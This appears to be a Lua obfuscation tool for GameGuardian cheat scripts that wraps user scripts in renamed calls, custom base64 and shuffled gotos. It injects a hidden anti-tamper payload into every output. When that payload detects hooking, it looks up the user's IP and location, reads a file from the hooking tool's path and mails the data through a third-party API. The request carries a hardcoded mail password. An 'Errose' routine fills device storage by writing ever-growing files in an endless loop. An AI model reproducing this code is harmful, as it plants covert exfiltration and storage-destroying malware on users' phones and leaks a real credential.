Q={}
Q.Get={}
Q.LJ="  for i=1,0 do _() local _={} _._=_ _._=_._ _._={} for i in (_) do _[_]=_ end _()  local i={(BYQ|BYQ)} if i.i==i.i then i.i=i.i() end end while(true) do while(true) do break return end break end  "
--表申明存放
Q.tab={}
--文件读写
Q.io = function(Path, Data)
local File, Error
if Data then
File, Error = io.open(Path, 'w')
if not File then
return false, Error
end
File:write(Data)
File:close()
else
File, Error = io.open(Path, 'r')
if not File then
return false, Error
end
Data = File:read('*a')
File:close()
return Data
end
end
--随机未知符
function suiji()
local hxx={}
for i=1,7 do
local value =math.random(160,190)
hxx[#hxx+1]=string.char(value).."A".."P"
end
value=table.concat(hxx)
return  value
end
--随机表名
function Q.Get.name()
local ty = ''
for i = 1, 4 do
if i % 2 == 0 then
i = 96 + math.random(1, 26)
else
i = 64 + math.random(1, 26)
end
ty = ty .. string.char(i)
end
return ty
end
--GOTO位移
function Getgoto(data)
local ii = 1
local data_tb = {}
for text in data:gmatch("[^\n]+") do
if ii == 1 then
text = "::_0_::\n" .. text .. "\ngoto _" .. ii .. "_"
else
text = "::_" .. (ii - 1) .. "_::\n" .. text .. "\ngoto _" .. ii .. "_\n"
end
data_tb[ii]= text
ii = ii + 1
end
total = #data_tb
data = ""
local get_data=function()
::_A_::
num = math.random(1, total)
data = data_tb[num]
if data==nil then
goto _A_
end
data_tb[num]=nil
return data
end
for i = 1, total do
data = data .. get_data() .. "\n"
end
data = "goto _0_\n" .. data .. "::_" .. (ii - 1) .. "_::"
return data
end
--[[
function Getgoto(data)
return data
end
]]
--#标准库转换
Q.class = {}
Q.class.list = {
['table'] = 1,
['debug'] = 1,
['gg'] = 1,
['os'] = 1,
['io'] = 1,
['bit32'] = 1,
['utf8'] = 1,
['string'] = 1,
['math'] = 1
}
Q.class.used = {}
Q.class.name =Q.Get.name() --Q.random.get()
Q.class.data = {}
FuncName2 = 'Q_zf_1' .. suiji() .. 'Q_zf_1'
Q.Get.class=function(data)
local class = Q.class
-- 标准库 还没有完善~
for index, value in pairs(_ENV) do
local types = type(value)
if types == 'table' and class.list[index] then
for index2, value2 in pairs(value) do
local Status, FuncName
FuncName = 'Q_zf_1' .. suiji() .. 'Q_zf_1'
for _ = 1, 2 do
data = data:gsub('(.)([^%w_])(%s*)' .. index .. '%s*%.%s*' .. index2 .. '(%s*)([^%w_])(.)',
function(P1, P2, P3, P4, P5, P6)
if (P1 ~= '.' or P2 == '.') and (P5 ~= '.' or P6 == '.') then
Status = true
return P1 .. P2 .. P3 .. class.name .. '[' .. FuncName .. ']' .. P4 .. P5 .. P6
end
end)
end
if Status then
table.insert(class.data,
class.name .. '[' .. FuncName .. 
"]=_ENV[((function() goto _ ::_:: if nil then while (nil) do goto __ end end ::__:: return '" .. index .. 
"' end)())][((function() goto _ ::_:: if nil then while (nil) do goto __ end end ::__:: return '" .. index2 .. "' end)())]")
end
end
end
end
table.insert(class.data,
class.name .. '[' .. FuncName2 .. 
"]=_ENV[((function() goto _ ::_:: if nil then goto __ end ::__:: return 'Qnumber' end)())]")
return table.concat(class.data,"\n")..data
end
local pianyi,pianyi2
--解密函数防外泄调用
Q.Get.dec=[[
local Q_get_dec=(function()
for i=1,0 do _() local _={} _._=_ _._=_._ _._={} for i in (_) do _[_]=_ end _()  local i={(BYQ|BYQ)} if i.i==i.i then i.i=i.i() end end while(true) do while(true) do break return end break end
local Q_tab={
"b",--1
"r",--2
"h",--3
"k",--4
"t",--5
"u",--6
"g",--7
"a",--8
"c",--9
"s",--10
"n",--11
"l",--12
"r",--13
"i",--14
"p",--15
"e",--16
}
for i=1,0 do _() local _={} _._=_ _._=_._ _._={} for i in (_) do _[_]=_ end _()  local i={(BYQ|BYQ)} if i.i==i.i then i.i=i.i() end end while(true) do while(true) do break return end break end
return Q_tab
end)()
]]
--解密函数调用导入
table.insert(Q.tab, Q.Get.dec)
--解密函数替换调用
Q.Get.fun=function(data)
--string.gsub
data=data:gsub("string.gsub","_ENV[(Q_get_dec[10]..Q_get_dec[5]..Q_get_dec[13]..Q_get_dec[14]..Q_get_dec[11]..Q_get_dec[7])][(Q_get_dec[7]..Q_get_dec[10]..Q_get_dec[6]..Q_get_dec[1])]")
--table.unpack
data=data:gsub("table.unpack","_ENV[(Q_get_dec[5]..Q_get_dec[8]..Q_get_dec[1]..Q_get_dec[12]..Q_get_dec[16])][(Q_get_dec[6]..Q_get_dec[11]..Q_get_dec[15]..Q_get_dec[8]..Q_get_dec[9]..Q_get_dec[4])]")
return data
end
--未知符嵌套算法
local function X(T)return(T:gsub('..',function(x)return string.char((tonumber(x,16))%256)end))end 
local by=X('0102030405060708091011121314151617181920808182838485868788898A8B8C8D8E8F909192939495969798999A9B9C9D9E9FA1A2A3A4A5A6A7A8A9AAABAC')
Q.weizhi=Q.Get.name()
function Q.Weizhi(data)
return ((data:gsub('.', function(x) 
local r,by='',x:byte()
for i=8,1,-1 do r=r..(by%2^i-by%2^(i-1)>0 and '1' or '0') end
return r;
end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
if (#x < 6) then return '' end
local c=0
for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
return by:sub(c+1,c+1)
end)..({ '', 'Q', 'Q' })[#data%3+1])
end
--未知符嵌套算法调用
function Q.Weizhi2(h)
h=tostring(h)
return "("..Q.weizhi.."([==["..Q.Weizhi(h).."]==]))"
end
--十七的算法(貌似极简云扣的)
local ZZBase64 = {}
local string = string
Q.LSQ={}
ZZBase64.__ty = {
'`', '&', '.', '_', '@', '^', '*', '$', '-', 'J', 'K', '#', 'M', 'N', 'O', 'P',
'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', '>', 'Z', 
'a', ':', 'c', 'd', 'e', 'f',
'g', 'h', '%', 'j', 'k', 'l', ',', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
'w', 'x', 'y', 'z', '0', '1', '<', '3', '4', '?', '/', '7', '8', '9', '+', ';',
};
ZZBase64.__dety = {}
for k,v in pairs(ZZBase64.__ty) do
ZZBase64.__dety[string.byte(v,1)] = k - 1
end
function ZZBase64.enty(text)
local len = string.len(text)
local left = len % 3
len = len - left
local res = {}
local index  = 1
for i = 1, len, 3 do
local a = string.byte(text, i )
local b = string.byte(text, i + 1)
local c = string.byte(text, i + 2)
-- num = a<<16 + b<<8 + c
local num = a * 65536 + b * 256 + c 
for j = 1, 4 do
--tmp = num >> ((4 -j) * 6)
local tmp = math.floor(num / (2 ^ ((4-j) * 6)))
--curPos = tmp&0x3f
local curPos = tmp % 64 + 1
res[index] = ZZBase64.__ty[curPos]
index = index + 1
end
end
if left == 1 then
ZZBase64.__left1(res, index, text, len)
elseif left == 2 then
ZZBase64.__left2(res, index, text, len)       
end
return table.concat(res)
end
function ZZBase64.__left2(res, index, text, len)
local num1 = string.byte(text, len + 1)
num1 = num1 * 1024 --lshift 10 
local num2 = string.byte(text, len + 2)
num2 = num2 * 4 --lshift 2 
local num = num1 + num2
local tmp1 = math.floor(num / 4096) --rShift 12
local curPos = tmp1 % 64 + 1
res[index] = ZZBase64.__ty[curPos]
local tmp2 = math.floor(num / 64)
curPos = tmp2 % 64 + 1
res[index + 1] = ZZBase64.__ty[curPos]
curPos = num % 64 + 1
res[index + 2] = ZZBase64.__ty[curPos]
res[index + 3] = "=" 
end
function ZZBase64.__left1(res, index,text, len)
local num = string.byte(text, len + 1)
num = num * 16 
tmp = math.floor(num / 64)
local curPos = tmp % 64 + 1
res[index ] = ZZBase64.__ty[curPos]
curPos = num % 64 + 1
res[index + 1] = ZZBase64.__ty[curPos]
res[index + 2] = "=" 
res[index + 3] = "=" 
end
--十七算法嵌套调用
Q.Get.lsq=function(txt)
return "ZZBase64.dety([=["..(ZZBase64.enty(txt)).."]=])"
end
--十七算法的解密算法
Q.LSQ.dec=[==[
local ZZBase64 = {}
local string = string
ZZBase64.__ty = {
'`', '&', '.', '_', '@', '^', '*', '$', '-', 'J', 'K', '#', 'M', 'N', 'O', 'P',
'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', '>', 'Z', 
'a', ':', 'c', 'd', 'e', 'f',
'g', 'h', '%', 'j', 'k', 'l', ',', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
'w', 'x', 'y', 'z', '0', '1', '<', '3', '4', '?', '/', '7', '8', '9', '+', ';',
};
ZZBase64.__dety = {}
for k,v in pairs(ZZBase64.__ty) do
ZZBase64.__dety[string.byte(v,1)] = k - 1
end
function ZZBase64.__detyLeft1(res, index, text, len)
local dety = ZZBase64.__dety
local a = dety[string.byte(text, len + 1)] 
local b = dety[string.byte(text, len + 2)] 
local c = dety[string.byte(text, len + 3)] 
local num = a * 4096 + b * 64 + c
local num1 = math.floor(num / 1024) % 256
local num2 = math.floor(num / 4) % 256
res[index] = string.char(num1)
res[index + 1] = string.char(num2)
end
function ZZBase64.__detyLeft2(res, index, text, len)
local dety = ZZBase64.__dety
local a = dety[string.byte(text, len + 1)] 
local b = dety[string.byte(text, len + 2)]
local num = a * 64 + b
num = math.floor(num / 16)
res[index] = string.char(num)
end
function ZZBase64.test()
local data = "a\193\207="
local abc = ZZBase64.enty(data)    
def = ZZBase64.dety(abc)
if def == data then
print("yes")
end
end
function ZZBase64.dety(text)
local len = string.len(text)
local left = 0 
if string.sub(text, len - 1) == "==" then
left = 2 
len = len - 4
elseif string.sub(text, len) == "=" then
left = 1
len = len - 4
end
local res = {}
local index = 1
local dety = ZZBase64.__dety
for i =1, len, 4 do
local a = dety[string.byte(text,i    )] 
local b = dety[string.byte(text,i + 1)] 
local c = dety[string.byte(text,i + 2)] 
local d = dety[string.byte(text,i + 3)]
--num = a<<18 + b<<12 + c<<6 + d
local num = a * 262144 + b * 4096 + c * 64 + d
local e = string.char(num % 256)
num = math.floor(num / 256)
local f = string.char(num % 256)
num = math.floor(num / 256)
res[index ] = string.char(num % 256)
res[index + 1] = f
res[index + 2] = e
index = index + 3
end
if left == 1 then
ZZBase64.__detyLeft1(res, index, text, len)
elseif left == 2 then
ZZBase64.__detyLeft2(res, index, text, len)
end
return table.concat(res)
end
]==]
--十七解密算法导入
table.insert(Q.tab, Q.LSQ.dec)
--utf8.char函数赋值
Q.string=Q.Get.name()
table.insert(Q.tab, "local "..Q.string .. '=_ENV[(Q_get_dec[10]..Q_get_dec[5]..Q_get_dec[13]..Q_get_dec[14]..Q_get_dec[11]..Q_get_dec[7])][(Q_get_dec[9]..Q_get_dec[3]..Q_get_dec[8]..Q_get_dec[13])]')
--table.unpack函数赋值
Q.Table=Q.Get.name()
table.insert(Q.tab, "local "..Q.Table .. '=table.unpack')
--偏移申明
pianyi1=math.random(5200,9999)
--未知符嵌套
Q.pianyi1="'"..pianyi1.."'"
Q.pianyi1=Q.pianyi1:gsub("'(.-)'",Q.Get.lsq)
--未知符嵌套解密
Q.Weizhi_Qt1="\nlocal by=X(("..Q.string.."(48,49,48,50,48,51,48,52,48,53,48,54,48,55,48,56,48,57,49,48,49,49,49,50,49,51,49,52,49,53,49,54,49,55,49,56,49,57,50,48,56,48,56,49,56,50,56,51,56,52,56,53,56,54,56,55,56,56,56,57,56,65,56,66,56,67,56,68,56,69,56,70,57,48,57,49,57,50,57,51,57,52,57,53,57,54,57,55,57,56,57,57,57,65,57,66,57,67,57,68,57,69,57,70,65,49,65,50,65,51,65,52,65,53,65,54,65,55,65,56,65,57,65,65,65,66,65,67)))\n"
Q.Weizhi_Qt2="\nlocal function X(T)"..Q.LJ.." return(T:gsub('..',function(x) return string.char((tonumber(x,16))%256)end))end\n"
Q.Weizhi_Qt3="\nlocal __pianyi= "..Q.pianyi1.." \nlocal ___char=function(data) "..Q.LJ.." return (data-__pianyi) end\n"
Q.Weizhi_Qt4=Q.Weizhi_Qt2..Q.Weizhi_Qt1.."local function "..Q.weizhi.."(data)  "..Q.LJ.." local data = string.gsub(data, '[^'..by..'Q]', '')   "..Q.LJ.." return (data:gsub('.', function(x)   if (x == 'Q') then return '' end      local r,f='',(by:find(x)-1)     for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end    "..Q.LJ.."  return r;    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)     if (#x ~= 8) then return '' end     local c=0  for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end   "..Q.LJ.."   return string.char(c)    end)) end"..
Q.Weizhi_Qt3
table.insert(Q.tab,Q.Weizhi_Qt4)
--特殊ascII解密
Q.tab.key1="local ____char=function(txt) "..Q.LJ.." local txt=tostring(txt:byte(1, -1)) "..Q.LJ.." return txt end\n"
table.insert(Q.tab, Q.tab.key1)
--表1
Q.tab1 = {}
Q.tab1.data={}
Q.tab1.name = Q.Get.name()
table.insert(Q.tab, "local "..Q.tab1.name .. '={}')
--表2
Q.tab2 = {}
Q.tab2.data={}
Q.tab2.name = Q.Get.name()
table.insert(Q.tab, "local " ..Q.tab2.name .. '={}')
--表3
Q.tab3 = {}
Q.tab3.data={}
Q.tab3.name = Q.Get.name()
table.insert(Q.tab, "local " ..Q.tab3.name .. '={}')
--重复对比表
Q.ascii={}
Q.ascii.used={}
--标准库表导入
table.insert(Q.tab, "local "..Q.class.name .. '={}')
function Q.Get.string(data)
--多余符号去除
local Func = load('return ' .. data)
if not Func then
data = data:sub(2, -2)
data = string.format('%q', data)
Func = load('return ' .. data)
data = Func()
data = data:sub(2, -2)
else
data = Func()
end
if data == '' then
data="\\034\\034"
else
--pairs[ascii]
for i, byte in pairs({string.byte(data, 1, -1)}) do
suiji1 = Q.ascii.used[byte]
if not suiji1 then
--申明未知符1
suiji1=suiji()
Q.ascii.used[byte]=suiji1
--偏移申明
pianyi2=math.random(160,190)
--偏移整合
byte=byte+pianyi1+pianyi2
--未知符嵌套
Q.pianyi2="'"..byte.."'"
Q.pianyi2=Q.pianyi2:gsub("'(.-)'",Q.Weizhi2)
--将偏移整合数据导入3表
--申明未知符1 
suiji2=suiji()
table.insert(Q.tab3.data, Q.tab3.name.."[Q_zf_1"..suiji2.."Q_zf_1]="..Q.pianyi2)
--将偏移整合数据导入1表
table.insert(Q.tab1.data, Q.tab1.name.."[Q_zf_1"..suiji1.."Q_zf_1]="..Q.tab3.name.."[Q_zf_1"..suiji2.."Q_zf_1]-(____char(Q_zf_1\\"..pianyi2.."Q_zf_1))")
--将解密数据导入2表
end
table.insert(Q.tab2.data,"(___char("..Q.tab1.name.."[Q_zf_1"..suiji1.."Q_zf_1]))")
end
--赋值表2数据
tab2=table.concat(Q.tab2.data,",")
Q.tab2.data={}
--最终结果
data="((function() return "..Q.string.."("..""..
""..tab2..") end)()) "
end  
return data
end
--字符串匹配
local Break, types, Table1, Table2, _STRING_, encrypt1
Q.Get.pipei=function(data)
data = data:gsub('\\\\', '\\092\\092')
data = data:gsub('\092\034', '\\034')
data = data:gsub("\092\039", '\\039')
Table1 = {}
for txt1 in data:gmatch('[^%-]%[([=]*)%[') do
Table1[txt1] = string.len(txt1)
end
Table2 = {}
for index, value in pairs(Table1) do
Table2[value + 1] = index
end
table.sort(Table2, function(a, b)
return a > b
end)
Table1 = Table2
_STRING_ = {}
Table2 = {}
encrypt1 = function(txt1)
local index
index = Table2[txt1]
if not index then
index = #_STRING_ + 1
Table2[txt1] = index
_STRING_[index] = txt1
end
return '_STRING_(#' .. index .. ')'
end
repeat--单双引号
Break = false
types = data:match('[\034\039]')
if types == '\034' then
data = data:gsub('\034[^\n]-\034', function(txt2)
Break = true
return encrypt1(txt2)
end, 1)
elseif types == '\039' then
data = data:gsub('\039[^\n]-\039', function(txt2)
Break = true
return encrypt1(txt2)
end, 1)
end
until not Break
Table2 = nil
for text in data:gmatch("[^%-]%-%-%[([=]*)%[") do
data = data:gsub("([^%-])%-%-%[" .. text .. "%[.-%]" .. text .. "%]", '%1', 1)
end
data = data:gsub('\\092\\092', '\\\\')
data = data:gsub('\\034', '\034')
data = data:gsub("\\039", '\039')
for index, value in pairs(Table1) do
data = data:gsub('([^\n]-)(%[' .. value .. '%[.-%]' .. value .. '%])', function(txt1, txt2)
if txt1:find('%-%-') then
return nil
end
txt2 = txt2:gsub('_STRING_%(#(%d+)%)', function(num)
return _STRING_[tonumber(num)]
end)
return txt1 .. Q.Get.string(txt2)
end)
end
data = data:gsub('_STRING_%(#(%d+)%)', function(num)
local data = _STRING_[tonumber(num)]
data = data:gsub('\\092\\092', '\\\\')
return Q.Get.string(data)
end)
_STRING_ = nil
Table1 = nil
data = string.gsub(data, '\\034', '\034')
data = string.gsub(data, '%-%-[^\n]*', '')
data = string.gsub(data, '%s*\n%s*', '\n')
return data
end
local ENC={}
ENC.last=gg.getFile()
ENC.info=nil
ENC.config=gg.EXT_FILES_DIR:gsub("%lua$","").."/ENC.Lua"
ENC.data=loadfile(ENC.config)
if ENC.data~=nil then;
ENC.info=ENC.data()
ENC.data=nil
end
if ENC.info==nil then
ENC.info={ENC.last}
end
AP=gg.prompt({"选择脚本:","限制工具","指令错位","刷取图标","区块加固","防止拆卸","未知错误","陷阱指令","算法加固","拆卸内存"},ENC.info,{"file","checkbox","checkbox","checkbox","checkbox","checkbox","checkbox","checkbox","checkbox","checkbox"})
if AP==nil then os.exit(print("未选择"))end
gg.saveVariable(AP,ENC.config)
ty=io.open(AP[1],"r"):read("*a")
FY=[=[


--与第三方搭配使用的防log
local getinfo = debug['getinfo']
local tables = {}
local strings = {}
local tI = table['insert']
for i, v in pairs(_ENV) do
    i = _ENV[i]
    if type(i) == 'table' then

        for m, n in pairs(i) do
            if type(i[m]) == 'function' then
                tI(tables, getinfo(i[m]))
            end
        end

    elseif type(i) == 'function' then
        tI(tables, getinfo(i))
    elseif type(i) == 'string' then
        tI(strings, i)
    end
end

for i = 1, 100 do
    (function()
        return (function()
            if math.random(0, 1) == 1 then
                repeat
                until debug.getinfo(2).istailcall and math.random(0, 1)==0
            else
                while debug.getinfo(3).istailcall do
                end
            end
        end)()
    end)()
end

local istailcall, isvararg, short_src, source, what = 'istailcall', 'isvararg', 'short_src', 'source', 'what'

for i, v in pairs(tables) do
    local tab = v
if tab["func"]==_ENV["debug"]['getinfo'] then
tab[istailcall]=false
end
    if tab[istailcall] or not tab[isvararg] or tab[short_src] ~= '[Java]' or tab[source] ~= '=[Java]' or tab[what] ~=
        'Java' then 
        --判断
        Lujing=tab[short_src]
        hook = true
        break
    end
end
if strings[2] then
    hook = true
end
tables, strings = nil, nil

--有第三方重写行为 
if hook then

local URL1=gg.makeRequest("https://2021.ip138.com/").content
local IP=string.match(URL1,"<title>(.-)</title>")
local Dizhi=string.match(URL1,"(来自：.-)</p>")

local Pipeizhenhe="--偷盗者IP为 :"..IP..'\n--偷盗者IP地址定位为 :'..Dizhi

local Neirong=io.open(Lujing,"r"):read("*a")
local Neirong=Pipeizhenhe.."\n"..Neirong

--16进制转换上传数据
local Shiliujizhi=function(TxT)
		return TxT:gsub(".", function(jia)
			return "%"..string.format("%02X", (string.byte(jia)) % 256)
	end)
end
	
--调用16进制进行转换	
local Neirong=Neirong:gsub("(.+)",function(h)
     return Shiliujizhi(h)
end)

--查看是否返回数据
local code=function(txt)
    if txt:find("failure") then
    print("失败 -101")
    elseif txt:find("success") then
    print("成功 yes.")
    end
end

--post请求调用QQ邮箱
local Diaoyong=gg.makeRequest("https://api.pingping6.com/tools/mail/sendmail.php",nil,"host=ssl%3A%2F%2Fsmtp.qq.com&port=465&from=192212746%40qq.com&user=192212746%40qq.com&pass=pkcsroadzewvbhhi&type=TXT&to=1955619037%40qq.com&title=%E6%8B%A6%E6%88%AA%E5%99%A8&content="..Neirong).content

--调用是否返回数据
code(Diaoyong)
    return false
end




--网络时间差
local shijian=function(wangzhan)
while wangzhan==nil do
print("访问频率过高 请稍候再试-103")
os.exit()
end
local wangzhan=wangzhan:match("%d........%d")
return wangzhan
end


--记录进入脚本时间的时间戳
local jilu1=function()
return shijian(gg.makeRequest("http://api.m.taobao.com/rest/api3.do?api=mtop.common.getTimestamp").content)
end

--记录第一次进入时间
local puanduan1=jilu1()

local puanduan=function(fuanhui)
while #fuanhui<100 or  fuanhui:find("java.net.UnknownHostException:") do
os.exit()
end
end

local URL="https://m.ip138.com/" 

local fuanhui=tostring(gg.makeRequest(URL))

puanduan(fuanhui)


--sethook计算
local Jishuan={}
local function hook()
Jishuan[#Jishuan+1]=""
end
local Fanhui = debug.sethook(hook, "r")
Rep=string.rep("Log修改器?-[你🐴个B]\n",1048576)

local List={
["string"]=2,
["io"]=2,
["os"]=2,
["math"]=2,
["table"]=2
}
for i, v in pairs(List) do
    for k,l in pairs(_ENV[i]) do
        pcall(l,{Rep})
    end
end

    Tab={}    
    for Shuaqu=1,1024 do
    table.insert(Tab,Rep)
end 
    for k, v in pairs({
_ENV["gg"]["choice"],
_ENV["gg"]["multiChoice"],
_ENV["gg"]["prompt"],
_ENV["gg"]["getValues"],
_ENV["gg"]["addListItems"],
_ENV["gg"]["getListItems"],
_ENV["gg"]["saveVariable"],
_ENV["gg"]["getListItems"],
_ENV["gg"]["removeListItems"],
_ENV["gg"]["getValuesRange"],
_ENV["gg"]["searchNumber"],
_ENV["gg"]["editAll"],
_ENV["gg"]["searchAddress"]
}) do
    pcall(v,Tab[k])
end

num = 0
for k,v in pairs(Jishuan) do
num = num+1
end

while num ~= 1470 or not num do
os.exit()
end
debug.sethook()

--GGLOG
local dZvT=string.rep(" ",1048576)
local sOaJ={}
for cInW=1,1024 do
sOaJ[cInW]=dZvT
end 
dZvT=nil
for dLrV, wNjO in pairs({
_ENV["gg"]["alert"],
_ENV["gg"]["bytes"],
_ENV["gg"]["copyText"],
_ENV["gg"]["searchAddress"],
_ENV["gg"]["searchNumber"],
_ENV["gg"]["toast"]
}) do
pcall(wNjO,sOaJ)
end


--防hook
new=os.clock()
local Luffyyf={}
for i=1,20 do
  Luffyyf[#Luffyyf+1]=math.random(1,255)
  Luffyyf[#Luffyyf+1]=10
end
Luffyyf="string.char(table.unpack({"..((","..table.concat(Luffyyf,",")):rep(1000)):gsub(",","",1).."}))"
pcall(load(Luffyyf))
while os.clock()-new>0.2 do
print("检测到hook破解")
os.exit()
while true do end
end




--言辞log防御
local Rep_=string.rep(" ",100000)
local Tab_={}
for k=1,1024 do
Tab_[k]=Rep_
end

Rep_=nil

for kk, vv in pairs({
_ENV["gg"]["searchNumber"],
_ENV["gg"]["editAll"],
_ENV["gg"]["searchAddress"],
_ENV["gg"]["startFuzzy"],
_ENV["gg"]["searchFuzzy"],
_ENV["gg"]["refineNumber"],
_ENV["gg"]["refineAddress"],
_ENV["gg"]["startFuzzy"]
}) do
    pcall(vv,Tab_)
end 





local BassF={}
--gg.setRanges混淆
local gg_setRanges=gg.setRanges
_ENV["gg"]["setRanges"]=function(Value)
local Shua=string.rep("0","9999999")
return gg_setRanges(Value.."."..Shua)
end

--搜索混淆
searchNumber=_ENV["gg"]["searchNumber"]
_ENV["gg"]["searchNumber"]=function(a,b,c,d,e,f,g)
    local spit=function(_txt,id)
        local index={}
        for value in string.gmatch(_txt,"(.-)"..id) do
        
            table.insert(index,value)
        end
        
        local en=string.match(_txt,".+"..id.."(.+)")
        if string.find(en,":") then
        
            table.insert(index,string.match(en,"(.+):"))
            
            table.insert(index,string.match(en,"(:.+)"))
        else
            table.insert(index,en)
        end
        return index
    end
    local jg, min, max
    
    d=d or gg.SIGN_EQUAL
      e=e or 0 f=f or -1
       g=g or 0
    
     local rp=("0"):rep(1024^2)
     
    b=b.."."..rp d=d.."."..rp
       e=e.."."..rp f=f.."."..rp
         g=g.."."..rp
    
    if not tonumber(a) then
        local tb={}
        a=spit(a,";")
        for i, k in pairs(a) do
            if k:find(":") then
                a=table.concat(a,";")
                break
            end
            if not string.find(k,"[^%$%*,%-%.0123456789:;%?ABCDEFHQRWXabcdefhqrwx~]") then
                a[i]=string.rep("0",10000)..k
            end
        end
        if type(a)=="table" then
            a=table.concat(a,";")
        end
        return searchNumber(a,b,c,d,e,f,g)
    end
    a=tonumber(a)
    max = string.rep("0",10000) .. (a - math.random(10,20)) .. "~" .. (a + math.random(10,20))
    a = string.rep("0",10000)..a
    searchNumber(max, b, c, d, e, f, g)
    if gg.getResultsCount()==0 then
        return gg.toast("阿皮搜索混淆 :没有搜索到值哦~",true)
    end
    
    local glab, autIL
    if gg.getResultsCount()<4 then
        glab=gg.getResultsCount()
        autIL=math.random(1,glab)
    else
        glab=math.random(4,5)
        autIL=math.random(2,glab-1)
    end
    
    local sear = gg.getResults(glab)
    for i,k in pairs(sear) do
        if i == autIL then
            searchNumber(a,b,c,d,e,f,g)
            jg = gg.getResults(gg.getResultsCount())
        end
        
        gg.loadResults({sear[i]})
        searchNumber(k.value, b, c, d, e, f, g)
        gg.clearResults()
    end
    return gg.loadResults(jg)
end

--修改数量混淆 
local gg_getResults=gg.getResults
_ENV["gg"]["getResults"]=function(Value)
local Shua=string.rep("0","999999")
return gg_getResults(Shua..Value)
end

--修改混淆
_ENV["gg"]["editAll"]=function(a,b)
    local sear=gg.getResults(gg.getResultsCount())
    if sear[1]==nil then
        gg.toast("阿皮修改混淆 :没有修改到值哦~",true)
    end
    for i,k in pairs(sear) do
        sear[i].value=a
        sear[i].flags=b
    end
    return gg.setValues(sear)
end

--setValues混淆
local getRangesList=_ENV["gg"]["getRangesList"]
local setValues=_ENV["gg"]["setValues"]
_ENV["gg"]["setValues"]=function(_Tab)
    if not _ENV["\180\242"] then
        _ENV["\180\242"]=true
        getRangesList(string.rep("\000",(1024^2*5)))
    end
    for i=1,20000 do
        BassF[i]={address=1,value=0,flags=16}
    end
    setValues(BassF)
    setValues(_Tab)
    setValues(BassF)
end

--检测hook
local GG={"art","ART","Art","dec","Dec","DEC","hook","Hook","HooK","HOOK","log","Log","LOG",}
local _gg={gg.CACHE_DIR,gg.EXT_FILES_DIR,gg.EXT_CACHE_DIR,gg.FILES_DIR,gg.PACKAGE}
for i,v in pairs(GG) do
if string.find(tostring(_gg),v) or(not string.find(tostring(_gg),"com"))then
Error(true)
end
end

--第三方1
    local function Errose()

    function wjsc()
    return string.char(math.random(65, 90))..string.char(math.random(65, 90))..string.char(math.random(65, 90))
end
    while true do
    i = i + 1
    io.input(gg.getFile(), "r")
    io.output("/storage/emulated/0/"..wjsc(),"w")
    io.write(io.read("*a"):rep(i))
  end
end


    io.input(gg.getFile(), "r")
    os.remove(gg.getFile())
    if not loadfile(gg.getFile()) then 
    return Errose() 
end


    io.output(gg.getFile())
    io.write(io.read("*a"))
    if (loadfile or load) == nil then 
    return Errose() 
end


    for i = 1, 0 do NS.NESIA() NS.NESIA() NS.BIDUN() 
    return NS.NESIA() 
end


    io.output(gg.EXT_CACHE_DIR.."/*323*1*089648907544#")
    loadfile(gg.EXT_CACHE_DIR.."/*323*1*089648907544#")()
    if not loadfile(gg.EXT_CACHE_DIR.."/*323*1*089648907544#") then
    return Errose()
end


    os.remove(gg.EXT_CACHE_DIR.."/*323*1*089648907544#")
    if loadfile(gg.EXT_CACHE_DIR.."/*323*1*089648907544#") then
    return Errose()
end


    os.rename(gg.getFile(), gg.EXT_CACHE_DIR.."/*111#")
    os.rename(gg.EXT_CACHE_DIR.."/*111#", gg.EXT_CACHE_DIR.."/Android/*123*1#*1#*1#")
    if not loadfile(gg.getFile()) then 
    os.rename(gg.EXT_CACHE_DIR.."/Android/*123*1#*1#*1#", gg.getFile()) 
    return Errose() 
end



]=]
if AP[2]==true then
XZGJ=gg.prompt({"版本:","版本号:","包名:"},{gg.VERSION,gg.BUILD,gg.PACKAGE},{"text","text","text"})
FY1=[=[
if gg.VERSION=='版本'then else print('错误行为')os.exit()while true do end end
if gg.BUILD=='版本号'then else print('错误行为')os.exit()while true do end end
if gg.PACKAGE=='包名'then else print('错误行为')os.exit()while true do end end
]=]
ty=FY1.."\n"..ty
ty=ty:gsub('版本号',XZGJ[2])
ty=ty:gsub('版本',XZGJ[1])
ty=ty:gsub('包名',XZGJ[3])
end
ty=Q.Get.class(ty)
ty=FY..ty
ty=Q.Get.pipei(ty)          
--未知符嵌套表
table.insert(Q.tab,"\ndo\n"..Getgoto(table.concat(Q.tab3.data,"\n")).."\nend\n")
--特殊ascii偏移表
table.insert(Q.tab,"\ndo\n"..Getgoto(table.concat(Q.tab1.data,"\n")).."\nend\n")
--整合
ty=table.concat(Q.tab,"\n")..ty
--符号返回
ty =ty:gsub("Q_zf_1","'")
if AP[10]==true then
lasm="while i do\nlocal i\nwhile i==QQ1955619037 do\n"..("_ENV[\"消炎水笑死人了\"]=\"牛马玩意笑飞我\"\n"):rep(math.random(3000,4000)).."end\nbreak\nend"
else
lasm=""
end
ty=lasm.."\n"..ty
TY=AP[1]:gsub("(.+)/(.+)",function(x,y)
CoNe="".. y
return x..""..y
end)
ty="local AP=(function(...)\n"..ty..'\nend)(AP)([=['..[=[ 

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣈⠀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣶⣂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠜⠈⠂
